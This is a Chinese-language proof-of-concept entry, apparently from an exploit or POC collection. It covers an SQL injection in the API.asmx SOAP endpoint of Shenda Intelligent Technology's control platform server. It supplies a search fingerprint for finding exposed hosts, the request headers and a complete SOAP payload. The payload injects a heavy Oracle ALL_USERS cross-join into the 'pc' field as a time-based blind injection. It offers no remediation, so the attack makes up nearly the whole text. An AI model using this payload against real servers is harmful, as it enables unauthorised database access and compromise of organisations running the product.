# 深大智能科技有限公司管控平台服务端API.asmx存在SQL注入漏洞

- **系统**：深大智能科技有限公司管控平台服务端　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="ItemsControlServer.aspx"`
- **请求**：`POST /API.asmx HTTP/1.1`
- **关键头**：`Content-Type: text/xml; charset=utf-8`　`Content-Length: length`　`SOAPAction: "http://tempuri.org/getPerformInfo"`

**请求体 / payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<getPerformInfo xmlns="http://tempuri.org/">
<pc>' OR 4155=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)-- AodC</pc>
<isa>string</isa>
</getPerformInfo>
</soap:Body>
</soap:Envelope>
```
- **预期**：200　|　—